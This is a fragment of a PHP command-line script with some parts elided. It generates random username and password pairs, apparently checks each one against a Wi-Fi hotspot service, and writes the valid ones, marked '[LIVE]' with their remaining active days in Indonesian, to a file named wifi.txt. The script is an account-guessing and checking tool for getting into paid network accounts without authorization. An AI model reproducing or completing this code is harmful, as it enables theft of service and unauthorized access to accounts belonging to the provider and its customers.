...
curl_close($ch);$json = json_decode($result);
	$act = $json->act;
	$exp = $json->expire;
	// $amount = $json->amount;
	...
	if ($act == "INVALID") {
		...
		echo " [error] Wrong Delimiter \n";
		die;
	}
	else{
		echo " [LIVE] => username: $user, password: $pass, Masa aktif $duration hari, hingga $exp WIB. CS:147 \n";
		fwrite(fopen("wifi.txt", "a"), " [LIVE] => username: $user, password: $pass, Masa aktif $duration hari, hingga $exp WIB. CS:147 \n");
	}
	sleep(1);
}
}if ($opsi == "1") {
...
// 		$length = trim(fgets(STDIN));
	...
	while ($i < $jmlh) {
		$length = rand(13,15);
		$user = $x.number(str_replace("-", "", strlen($x) -$length));
		$pass = name(3);
		echo "$user|$pass \n \n";
